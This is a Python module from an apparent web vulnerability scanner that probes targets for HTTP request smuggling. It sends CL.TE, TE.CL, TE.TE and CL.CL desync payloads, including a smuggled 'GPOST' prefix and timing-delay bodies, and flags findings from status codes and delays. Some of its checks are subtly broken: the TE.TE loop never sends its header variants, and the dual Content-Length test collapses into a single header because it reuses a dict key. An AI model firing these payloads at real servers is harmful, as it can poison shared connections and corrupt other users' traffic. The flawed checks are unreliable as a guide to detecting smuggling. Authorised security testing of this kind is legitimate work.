import asyncio
import time
from modules.base import BaseModule


class SmuggleModule(BaseModule):
    name = "smuggle"
    description = "HTTP Request Smuggling Scanner"
    
    async def scan(self, target):
        self.findings = []
        
        self.baseline_times = await self._establish_baseline(target)
        
        await self._test_cl_te(target)
        await self._test_cl_te_variants(target)
        await self._test_te_cl(target)
        await self._test_te_cl_variants(target)
        await self._test_te_te(target)
        await self._test_cl_cl(target)
        
        if self.aggressive:
            await self._test_timing_confirmation(target)
        
        return self.findings
    
    async def _establish_baseline(self, target):
        times = []
        for _ in range(5):
            start = time.time()
            resp = await self.http.get(target)
            elapsed = time.time() - start
            if resp.get("status"):
                times.append(elapsed)
        
        if times:
            avg = sum(times) / len(times)
            return {"avg": avg, "max": max(times), "samples": times}
        return {"avg": 0.5, "max": 1.0, "samples": []}
    
    async def _test_timing_confirmation(self, target):
        delay_payloads = [
            {
                "name": "CL.TE time delay",
                "body": "1\r\nZ\r\nQ",
                "headers": {"Content-Length": "6", "Transfer-Encoding": "chunked"},
                "expected_delay": 5.0,
            },
            {
                "name": "TE.CL time delay",
                "body": "0\r\n\r\nGET /delay HTTP/1.1\r\nHost: x\r\nContent-Length: 100\r\n\r\n",
                "headers": {"Transfer-Encoding": "chunked", "Content-Length": "4"},
                "expected_delay": 5.0,
            },
        ]
        
        for test in delay_payloads:
            start = time.time()
            resp = await self.http.post(
                target,
                data=test["body"],
                headers=test["headers"]
            )
            elapsed = time.time() - start
            
            baseline_max = self.baseline_times.get("max", 1.0)
            if elapsed > baseline_max + 4.0:
                time_anomaly = self.detect_time_anomaly([elapsed], self.baseline_times["avg"])
                if time_anomaly and time_anomaly.get("is_anomaly"):
                    self.add_finding(
                        "CRITICAL",
                        f"HTTP Smuggling CONFIRMED via timing: {test['name']}",
                        url=target,
                        evidence=f"Response: {elapsed:.2f}s vs baseline {baseline_max:.2f}s",
                        confidence_evidence=["timing_anomaly_confirmed", "significant_delay"],
                        request_data={"method": "POST", "url": target, "headers": test["headers"]}
                    )
                    return
    
    async def _test_cl_te(self, target):
        smuggle_body = "0\r\n\r\nGPOST / HTTP/1.1\r\nContent-Length: 10\r\n\r\nx="
        
        resp1 = await self.http.post(
            target,
            data=smuggle_body,
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Transfer-Encoding": "chunked",
            }
        )
        
        if resp1.get("status"):
            await asyncio.sleep(1)
            
            resp2 = await self.http.get(target)
            
            if resp2.get("status"):
                if resp2["status"] == 405 or "GPOST" in resp2.get("text", ""):
                    self.add_finding(
                        "CRITICAL",
                        "HTTP Request Smuggling (CL.TE)",
                        url=target,
                        evidence="Front-end uses Content-Length, back-end uses Transfer-Encoding",
                        confidence_evidence=["poisoned_response", "method_change_reflected"],
                        request_data={"method": "POST", "url": target, "payload": "CL.TE GPOST prefix"}
                    )
                    return
        
        baseline = self.baseline_times.get("avg", 0.5) if hasattr(self, "baseline_times") else 0.5
        
        smuggle_resp = await self.http.post(
            target,
            data="1\r\nZ\r\nQ",
            headers={
                "Content-Length": "4",
                "Transfer-Encoding": "chunked",
            }
        )
        
        elapsed = smuggle_resp.get("elapsed", 0)
        if elapsed > baseline + 5:
            time_anomaly = self.detect_time_anomaly([elapsed], baseline)
            evidence_list = ["timing_delay"]
            if time_anomaly and time_anomaly.get("is_anomaly"):
                evidence_list.append("statistical_anomaly")
            
            self.add_finding(
                "HIGH",
                "Possible HTTP Request Smuggling (CL.TE) - timing anomaly",
                url=target,
                evidence=f"Response delayed: {elapsed:.2f}s vs baseline {baseline:.2f}s",
                confidence_evidence=evidence_list,
                request_data={"method": "POST", "url": target, "headers": {"CL": "4", "TE": "chunked"}}
            )
    
    async def _test_cl_te_variants(self, target):
        cl_te_payloads = [
            ("0\r\n\r\nG", 6, "CL.TE prefix"),
            ("0\r\n\r\nGET / HTTP/1.1\r\nHost: x\r\n\r\n", 4, "CL.TE GET prefix"),
            ("5\r\nxxxxx\r\n0\r\n\r\nG", 6, "CL.TE chunk then prefix"),
            ("0\r\n\r\n", 3, "CL.TE minimal"),
        ]
        for body, cl_val, name in cl_te_payloads:
            resp = await self.http.post(
                target,
                data=body,
                headers={
                    "Content-Length": str(cl_val),
                    "Transfer-Encoding": "chunked",
                }
            )
            if resp.get("status"):
                await asyncio.sleep(0.5)
                r2 = await self.http.get(target)
                if r2.get("status") in [400, 405, 500] or "G" in (r2.get("text") or ""):
                    self.add_finding(
                        "HIGH",
                        f"HTTP Request Smuggling variant ({name})",
                        url=target,
                        evidence=f"CL={cl_val}, TE chunked"
                    )
                    return
    
    async def _test_te_cl(self, target):
        smuggle_body = "0\r\n\r\n"
        
        resp = await self.http.post(
            target,
            data=smuggle_body,
            headers={
                "Content-Length": "3",
                "Transfer-Encoding": "chunked",
            }
        )
        
        if resp.get("status"):
            await asyncio.sleep(1)
            
            resp2 = await self.http.get(target)
            
            if resp2.get("status") in [400, 405, 500]:
                self.add_finding(
                    "MEDIUM",
                    "Possible HTTP Request Smuggling (TE.CL)",
                    url=target,
                    evidence="Back-end may use Content-Length over Transfer-Encoding"
                )
    
    async def _test_te_cl_variants(self, target):
        te_cl_bodies = [
            ("0\r\n\r\n", "TE.CL minimal"),
            ("0\r\n\r\nX", "TE.CL with trailing"),
            ("1\r\nA\r\n0\r\n\r\n", "TE.CL two chunks"),
        ]
        for body, name in te_cl_bodies:
            resp = await self.http.post(
                target,
                data=body,
                headers={
                    "Content-Length": str(len(body) + 1),
                    "Transfer-Encoding": "chunked",
                }
            )
            if resp.get("status"):
                await asyncio.sleep(0.5)
                r2 = await self.http.get(target)
                if r2.get("status") in [400, 405, 500]:
                    self.add_finding(
                        "MEDIUM",
                        f"HTTP Request Smuggling TE.CL variant ({name})",
                        url=target,
                        evidence="TE then CL desync"
                    )
                    return
    
    async def _test_cl_cl(self, target):
        resp = await self.http.post(
            target,
            data="x=1",
            headers={
                "Content-Length": "4",
                "Content-Length": "10",
            }
        )
        if resp.get("status") in [400, 411, 500]:
            self.add_finding(
                "INFO",
                "Dual Content-Length causes error (CL.CL handling)",
                url=target,
                evidence="Server reacts to conflicting CL headers"
            )
    
    async def _test_te_te(self, target):
        te_variants = [
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
            "Transfer-Encoding: x\r\nTransfer-Encoding: chunked",
            "Transfer-encoding: chunked",
            "Transfer-Encoding:\tchunked",
            "Transfer-Encoding: \tchunked",
            " Transfer-Encoding: chunked",
            "X: X\r\nTransfer-Encoding: chunked",
        ]
        
        for te_header in te_variants:
            try:
                resp = await self.http.request(
                    "POST",
                    target,
                    data="0\r\n\r\n",
                    headers={
                        "Content-Type": "application/x-www-form-urlencoded",
                    }
                )
                
                if resp.get("status") in [400, 500, 501]:
                    continue
                    
            except:
                pass
        
        resp = await self.http.post(
            target,
            data="0\r\n\r\n",
            headers={
                "Transfer-Encoding": "chunked",
                "Transfer-encoding": "x",
            }
        )
        
        if resp.get("status") and resp["status"] not in [400, 501]:
            self.add_finding(
                "MEDIUM",
                "Server accepts multiple Transfer-Encoding headers",
                url=target,
                evidence="May be vulnerable to TE.TE smuggling"
            )
